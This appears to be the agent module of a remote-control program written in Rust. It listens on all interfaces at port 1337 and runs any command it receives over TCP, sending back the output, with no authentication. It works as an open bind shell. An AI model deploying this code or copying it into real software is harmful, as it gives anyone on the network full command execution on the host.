use crate::communication::messages::{
    Message, MessageType, RunCommandRequest, RunCommandResponse, MESSAGE_HEADER_LENGTH,
    MESSAGE_LENGTH_SIZE, MESSAGE_TYPE_SIZE,
};
use crate::os;

use std::io::{Error, Read, Write};
use std::net::{Shutdown, TcpListener, TcpStream};
use std::str::from_utf8;
use std::thread;

use crate::communication::serialization::extract_msg_type_and_length;
use byteorder::{BigEndian, WriteBytesExt};
use ron;
use std::sync::mpsc::TryRecvError;

const BIND_ADDR: &str = "0.0.0.0:1337";

fn run_command_message(request: RunCommandRequest) -> Result<RunCommandResponse, Error> {
    let output = os::run_command(&request.command);
    let output = output.unwrap();

    println!("Output: {}", from_utf8(&output.stdout).unwrap());
    let response = RunCommandResponse {
        stdout: output.stdout,
        stderr: output.stderr,
        error_code: output.status.code().unwrap_or(-1),
    };

    println!("Message: {:?}", response);

    Ok(response)
}

fn handle_message(message: Message, mut stream: &TcpStream) {
    if message.message_type == MessageType::RunCommandType as u8 {
        println!("Run command type!");
        let request: RunCommandRequest = ron::de::from_bytes(&message.serialized_message).unwrap();
        let response = run_command_message(request).unwrap();
        let serialized_message = ron::ser::to_string(&response).unwrap();
        let message_len = serialized_message.len();
        let message_type = MessageType::RunCommandType as u8;

        let mut buffer: Vec<u8> = Vec::with_capacity(message_len + MESSAGE_HEADER_LENGTH);
        buffer.push(message_type);
        buffer.write_u32::<BigEndian>(message_len as u32).unwrap();
        buffer.extend(serialized_message.into_bytes());

        println!("Buffer sending: {:?}", &buffer);
        stream.write(&buffer).unwrap();
    } else if message.message_type == MessageType::DownloadFileType as u8 {
        println!("Download file type!")
    }
}

fn get_message(mut stream: &TcpStream) -> Result<Message, Error> {
    let mut type_and_length = [0 as u8; MESSAGE_HEADER_LENGTH];
    match stream.read_exact(&mut type_and_length) {
        Ok(()) => {
            let (msg_type, msg_length) = extract_msg_type_and_length(type_and_length);
            let mut message = vec![0; msg_length];

            // Read_exact function guarantees that we will read exactly enough data to fill the buffer
            stream
                .read_exact(&mut message)
                .expect("Could not read message after getting message metadata. Error: {}");
            return Ok(Message {
                message_type: msg_type,
                serialized_message_length: msg_length,
                serialized_message: message,
            });
            //                handle_message(&message, msg_type, &stream);
        }
        Err(e) => {
            println!(
                "An error occurred, terminating connection with {}. Error: {}",
                stream.peer_addr()?,
                e
            );
            stream.shutdown(Shutdown::Both)?;
            return Err(e);
        }
    }
    panic!("Unexpectedly exited stream read.");
}

fn handle_client(mut stream: TcpStream) -> Result<(), Error> {
    println!("Handling connection from {}", stream.peer_addr()?);
    while match get_message(&mut stream) {
        Ok(message) => {
            handle_message(message, &stream);
            true
        }
        Err(e) => {
            println!(
                "An error occurred while trying to get message. Error: {}",
                e
            );
            return Err(e);
        }
    } {}
    Ok(())
}

pub fn run_server() -> Result<(), Error> {
    // If we can't open the server, it probably means:
    // - The port is already taken, or we are not running in sufficient permissions
    // - If we are not running in sufficient permissions, panic.
    // - If the port is open, also panic (In the future might add a feature to handle it)
    let listener = TcpListener::bind(BIND_ADDR)?;
    match listener.local_addr() {
        Ok(address) => {
            println!("Listening on: {:?}", address);
        }
        Err(e) => {
            println!("Error {} while trying to get local address.", &e);
        }
    };
    // accept connections and process them serially
    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New connection with: {}", stream.peer_addr()?);
                thread::spawn(move || {
                    // connection succeeded
                    // TODO what to do if this returns Error
                    handle_client(stream)
                });
            }
            Err(e) => {
                println!("Connection failed: {}", e);
                /* connection failed */
            }
        }
    }
    // TODO catch this panic
    panic!("Server closed unexpectedly")
}
